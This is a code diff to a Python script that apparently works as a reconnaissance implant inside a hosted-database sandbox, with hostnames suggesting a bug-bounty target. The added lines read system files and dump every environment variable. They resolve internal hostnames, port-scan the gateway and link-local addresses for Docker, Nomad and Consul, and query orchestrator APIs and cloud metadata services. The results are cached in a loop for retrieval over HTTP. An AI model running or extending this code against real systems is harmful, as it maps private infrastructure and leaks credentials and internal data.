@@ -5,6 +5,7 @@ TOKEN = "r7xQ2kT9mV4bZ8wP"
 CACHE = {"status": "warming-up"}
 FQ = "falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com"
 PG = "pg-reaudit1-test12345323456-ae5b.l.aivencloud.com"
+GW = "10.156.0.1"
 
 def tcp(target, port, timeout=3):
     try:
@@ -20,26 +21,29 @@ def tcp(target, port, timeout=3):
     except Exception as e:
         return {"tcp": type(e).__name__ + ": " + str(e)}
 
-def http(url, headers=None, method="GET", timeout=2):
+def portscan(target, ports):
+    return {str(p): tcp(target, p, 2) for p in ports}
+
+def http(url, headers=None, method="GET", timeout=3):
     try:
         class NR(urllib.request.HTTPRedirectHandler):
             def redirect_request(self, *a): return None
         op = urllib.request.build_opener(NR)
         req = urllib.request.Request(url, headers=headers or {}, method=method)
         r = op.open(req, timeout=timeout)
-        return {"status": r.status, "body": r.read(300).decode("utf-8", "replace")}
+        return {"status": r.status, "body": r.read(500).decode("utf-8", "replace")}
     except urllib.error.HTTPError as e:
         try:
-            body = e.read(300).decode("utf-8", "replace")
+            body = e.read(500).decode("utf-8", "replace")
         except Exception:
             body = ""
         return {"status": e.code, "body": body}
     except Exception as e:
         return {"error": type(e).__name__ + ": " + str(e)}
 
-def safe(p):
+def safe(p, n=1000):
     try:
-        return open(p).read()[:1000]
+        return open(p).read()[:n]
     except Exception as e:
         return type(e).__name__
 
@@ -54,22 +58,30 @@ def run_all():
     o["env"] = dict(os.environ)
     o["hostname"] = socket.gethostname()
     o["resolv_conf"] = safe("/etc/resolv.conf")
+    o["hosts"] = safe("/etc/hosts")
     o["route"] = safe("/proc/net/route")
+    o["fib_trie"] = safe("/proc/net/fib_trie", 1500)
+    o["status_proc"] = safe("/proc/self/status", 1600)
     o["mounts"] = safe("/proc/self/mounts")
-    o["cgroup"] = safe("/proc/self/cgroup")
     o["dns_falcon"] = out(FQ)
     o["dns_own_pg"] = out(PG)
+    o["dns_falcon_internal"] = out("falcon-1.dev-sandbox.aiven.local")
+    o["dns_internal_devsandbox"] = out("falcon.dev-sandbox.aiven.local")
+    o["dns_internal_main"] = out("main.aiven.local")
     o["tcp_falcon_33046"] = tcp("129.213.46.149", 33046)
     o["tcp_own_pg_26247"] = tcp(PG, 26247)
     o["tcp_internet_1111_443"] = tcp("1.1.1.1", 443)
     o["tcp_imds_80"] = tcp("169.254.169.254", 80)
-    o["http_imds_generic"] = http("http://169.254.169.254/")
-    o["http_imds_aws_token"] = http("http://169.254.169.254/latest/api/token",
-        {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}, method="PUT")
+    o["scan_gw"] = portscan(GW, [22, 53, 443, 2375, 2376, 2377, 4646, 4647, 8500, 8600, 8000, 8080, 9090, 5545])
+    o["scan_imds_resolv"] = portscan("169.254.1.1", [22, 53, 443, 2375, 2376, 4646, 4647, 8500, 8080])
+    o["http_gw_nomad"] = http("http://" + GW + ":4646/v1/agent/self")
+    o["http_gw_nomad_nodes"] = http("http://" + GW + ":4646/v1/nodes")
+    o["http_gw_podman"] = http("http://" + GW + ":2375/_ping")
+    o["http_gw_consul"] = http("http://" + GW + ":8500/v1/kv/?keys")
+    o["http_nomad_254_1_1"] = http("http://169.254.1.1:4646/v1/agent/self")
+    o["http_nomad_254_1_1_nodes"] = http("http://169.254.1.1:4646/v1/nodes")
     o["http_gcp_metadata"] = http("http://metadata.google.internal/computeMetadata/v1/",
         {"Metadata-Flavor": "Google"})
-    o["http_do_metadata"] = http("http://169.254.169.254/metadata/v1.json")
-    o["http_alibaba_metadata"] = http("http://100.100.100.200/latest/meta-data/")
     return o
 
 def loop():
@@ -78,7 +90,7 @@ def loop():
             CACHE.update(run_all())
         except Exception as e:
             CACHE["loop_error"] = type(e).__name__ + ": " + str(e)
-        threading.Event().wait(30)
+        threading.Event().wait(45)
 
 class H(BaseHTTPRequestHandler):
     def do_GET(self):
